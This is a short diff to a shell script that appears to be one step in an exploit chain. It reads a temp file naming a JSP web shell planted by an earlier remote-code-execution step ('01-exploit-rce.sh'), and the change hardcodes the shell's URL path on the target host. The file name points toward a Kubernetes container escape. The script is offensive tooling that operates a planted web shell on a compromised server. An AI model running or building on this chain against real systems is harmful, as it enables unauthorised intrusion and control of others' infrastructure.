@@ -11,12 +11,7 @@
 SHELL_FILE="/tmp/.k8s-escape-shell"
 if [ -f "$SHELL_FILE" ]; then
     SHELL_NAME=$(sed -n '1p' "$SHELL_FILE")
-    SHELL_CTX=$(sed -n '3p' "$SHELL_FILE")
-    if [ "$SHELL_CTX" = "ROOT" ]; then
-        SHELL_URL="http://${HOST}/${SHELL_NAME}.jsp"
-    else
-        SHELL_URL="http://${HOST}/app/${SHELL_NAME}.jsp"
-    fi
+    SHELL_URL="http://${HOST}/app/${SHELL_NAME}.jsp"
 else
     echo "ERROR: Run step 1 first (./01-exploit-rce.sh)"
     exit 1
